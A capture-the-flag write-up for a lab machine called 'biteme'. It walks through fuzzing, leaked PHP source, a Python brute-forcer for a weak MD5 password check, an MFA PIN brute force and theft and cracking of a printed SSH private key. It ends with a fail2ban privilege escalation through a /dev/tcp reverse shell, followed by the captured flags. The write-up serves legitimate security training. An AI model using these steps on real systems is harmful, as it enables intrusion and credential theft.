# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250609145216.png](../../IMAGES/Pasted%20image%2020250609145216.png)

Simple apache2 page, source code is normal too, let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.64.184/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.64.184/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

console [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 177ms]
```

We got `console`, let's check it out:

![Pasted image 20250609145432.png](../../IMAGES/Pasted%20image%2020250609145432.png)


We got a login page, if we check the source code we find this:

![Pasted image 20250609145512.png](../../IMAGES/Pasted%20image%2020250609145512.png)

There is a packed javascript function, let's unpack it:

![Pasted image 20250609145600.png](../../IMAGES/Pasted%20image%2020250609145600.png)

We got two possible users: `fred` and `jason`, also the note is saying he turned `file syntax highlighting`, let's check this out:

![Pasted image 20250609145848.png](../../IMAGES/Pasted%20image%2020250609145848.png)

That means we should be able to read the source code of `.phps` files, let's fuzz to confirm which files we can read:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.64.184/console/FUZZ" -ic -c -t 200 -e .phps

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.64.184/console/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .phps
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.phps [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 175ms]
index.phps [Status: 200, Size: 9325, Words: 297, Lines: 3, Duration: 177ms]
css [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 176ms]
config.phps [Status: 200, Size: 354, Words: 17, Lines: 4, Duration: 211ms]
functions.phps [Status: 200, Size: 2010, Words: 93, Lines: 4, Duration: 177ms]
```

Let's check those files out:

**Index.phps**

```php
 <?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
 $image = new Securimage();

 if (!$image->check($_POST['captcha_code'])) {
 $showCaptchaError = true;
 } else {
 if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
 setcookie('user', $_POST['user'], 0, '/');
 setcookie('pwd', $_POST['pwd'], 0, '/');
 header('Location: mfa.php');
 exit();
 } else {
 $showError = true;
 }
 }
}
?>
<!doctype html>
<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <title>Sign in</title>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
 <link rel="stylesheet" href="/console/css/style.css">
 <script>
 function handleSubmit() {
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
 return true;
 }
 </script>
 </head>
 <body class="text-center">
 <form action="index.php" method="post" class="form-signin" onsubmit="return handleSubmit()">
 <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
 <input type="text" name="user" class="form-control" placeholder="Username" required>
 <input type="password" name="pwd" class="form-control" placeholder="Password" required>
 <?php echo Securimage::getCaptchaHtml(); ?>
 <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
 <input type="hidden" name="clicked" id="clicked" value="">
 <?php if ($showCaptchaError): ?><p class="mt-3 mb-3 text-danger">Incorrect captcha</p><?php endif ?>
 <?php if ($showError): ?><p class="mt-3 mb-3 text-danger">Incorrect details</p><?php endif ?>
 </form>
 </body>
</html>
```


**Functions.phps**

```php
 <?php
include('config.php');

function is_valid_user($user) {
 $user = bin2hex($user);

 return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
 $hash = md5($pwd);

 return substr($hash, -3) === '001';
} 
```

**Config.phps**

```php
 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 
```


We got a lot of valuable information from these files:

**Index.phps** initializes a session and brings in both the custom functions and the Securimage CAPTCHA library before rendering a login form. It inspects POST data for a username, password, CAPTCHA code, and a hidden œclicked flag (set via an obfuscated JavaScript eval), then verifies the CAPTCHA server-side. If the CAPTCHA passes and both the username and password validations succeed, it stores the raw credentials in cookies and redirects the user to mfa.php; otherwise it shows either a captcha error or a generic œincorrect details message.

**Functions.phps** loads configuration from config.php and exposes two validation routines. The first, is_valid_user, transforms the supplied username into hexadecimal with bin2hex and checks it against the LOGIN_USER constant. The second, is_valid_pwd, hashes the provided password with MD5 and deems it valid if the final three characters of the hex digest are œ001. A developer comment hints at future hardening ideas.

**Config.phps** simply defines the LOGIN_USER constant as the hex string œ6a61736f6e5f746573745f6163636f756e74, which decodes to the literal username jason_test_account. This ties straight into the user-validation logic and makes it clear exactly which username will pass the check.


With this info, we can begin the exploitation phase.


# EXPLOITATION
---

The implementation for the password is poorly done, it only checks if the md5 hash ends up in `001`, we can use a python script to automate the process of finding valid passwords, let's use rockyou:

```python
#!/usr/bin/env python3
import hashlib
import sys

WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'
TARGET_SUFFIX = '001'
MAX_RESULTS = 10

def md5_endswith(word: str, suffix: str) -> bool:
 return hashlib.md5(word.encode('utf-8')).hexdigest().endswith(suffix)

def search_rockyou():
 found = []
 try:
 with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
 for line in f:
 for word in line.split():
 if md5_endswith(word, TARGET_SUFFIX):
 found.append(word)
 if len(found) >= MAX_RESULTS:
 return found
 return found
 except FileNotFoundError:
 print(f"Wordlist not found at {WORDLIST_PATH}", file=sys.stderr)
 sys.exit(1)

if __name__ == '__main__':
 results = search_rockyou()
 if results:
 print("[+] You can use these passwords:")
 for pwd in results:
 print(pwd)
 else:
 print("No matches found.")

```


We get:

```
python3 bruteforce.py
[+] You can use these passwords:
violet
gymnastics
chingy
sugarplum
raiden
122187
stokes
080884
021105
BLONDIE
```

Ok, a bunch of passwords can be used for `jason_test_account`, let's use `raiden`:


![Pasted image 20250609152202.png](../../IMAGES/Pasted%20image%2020250609152202.png)

![Pasted image 20250609152210.png](../../IMAGES/Pasted%20image%2020250609152210.png)

Now we got another issue, we need some way to bypass MFA, let's send the request to a proxy and check it:

![Pasted image 20250609152348.png](../../IMAGES/Pasted%20image%2020250609152348.png)

The vulnerable aspect of this MFA code is that we can submit as many pins as we want, we can brute force it exploiting this, let's create a wordlist first:

```
seq -w 0 9999 > mfa_codes.txt
```

Once we got our wordlist, we can either use a fuzzing tool like `wfuzz` or an intruder such as caido's one or burp's:


![Pasted image 20250609152639.png](../../IMAGES/Pasted%20image%2020250609152639.png)

With Caido automate functionality, the brute force will take a couple minutes to finish, let's wait until it finishes and we filter for length:

![Pasted image 20250609152951.png](../../IMAGES/Pasted%20image%2020250609152951.png)

Ok, we got our `mfa` code, let's go into the panel:

![Pasted image 20250609153036.png](../../IMAGES/Pasted%20image%2020250609153036.png)

We got a `file browser` and `file viewer` functionality, the first one let's us list the files in the directory we specify:

![Pasted image 20250609162434.png](../../IMAGES/Pasted%20image%2020250609162434.png)

The file viewer, let us read the specific files, let's check if we can read `id_rsa`:


![Pasted image 20250609162511.png](../../IMAGES/Pasted%20image%2020250609162511.png)

We got fred and jason:

![Pasted image 20250609162543.png](../../IMAGES/Pasted%20image%2020250609162543.png)

![Pasted image 20250609162521.png](../../IMAGES/Pasted%20image%2020250609162521.png)

Only Jason has `.ssh`:

![Pasted image 20250609162601.png](../../IMAGES/Pasted%20image%2020250609162601.png)

There it is, let's get it:


```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----
```

It is encrypted, which means we need to use `ssh2john` to crack it:

```
nano id_rsa
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
1a2b3c4d (id_rsa)
```

There we go, we got it, let's proceed to ssh then:

```
chmod 600 id_rsa

ssh jason@IP -i id_rsa
```


![Pasted image 20250609162846.png](../../IMAGES/Pasted%20image%2020250609162846.png)


We can now begin privilege escalation.



# PRIVILEGE ESCALATION
---


Let's check our privileges:

```
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
 (ALL : ALL) ALL
 (fred) NOPASSWD: ALL
```

We can run any commands as fred without a password, let's switch users then:

```
sudo -u fred /bin/bash
```

![Pasted image 20250609163806.png](../../IMAGES/Pasted%20image%2020250609163806.png)

Let's check our privileges then:

```
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
 (root) NOPASSWD: /bin/systemctl restart fail2ban
```

We can restart the fail2ban service, let's check info on how to escalate privileges with it:

PRIVESC: https://exploit--notes-hdks-org.translate.goog/exploit/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc

![Pasted image 20250609164244.png](../../IMAGES/Pasted%20image%2020250609164244.png)


![Pasted image 20250609164300.png](../../IMAGES/Pasted%20image%2020250609164300.png)

![Pasted image 20250609164312.png](../../IMAGES/Pasted%20image%2020250609164312.png)

Basically, we need to modify the configuration file, restart the service and trigger the `fail2ban` action to get a shell as root, let's modify:

```
/etc/fail2ban/action.d/iptables-multiport.conf
```

![Pasted image 20250609164528.png](../../IMAGES/Pasted%20image%2020250609164528.png)

On here, we need to modify the `actionban` to match a reverse shell, we can do:

```
actionban = bash -c "bash -i >& /dev/tcp/IP/9001 0>&1"
```

Once we modify the file, restart the service with sudo:

```
sudo /bin/systemctl restart fail2ban
```

We now need to set up a listener and trigger `fail2ban` since it is an anti-bruteforce protection service, we need to bruteforce the login, let's use hydra to automate the process:

```
hydra -l random -P /usr/share/wordlists/rockyou.txt ssh://10.10.64.184 -t 40
```

![Pasted image 20250609164917.png](../../IMAGES/Pasted%20image%2020250609164917.png)

There we go, as seen we receive the reverse shell as root, let's read both flags and end the CTF:

```
root@biteme:/# cat /home/jason/user.txt
THM{6fbf1fb7241dac060cd3abba70c33070}

root@biteme:/# cat /root/root.txt
THM{0e355b5c907ef7741f40f4a41cc6678d}
```


![Pasted image 20250609165033.png](../../IMAGES/Pasted%20image%2020250609165033.png)



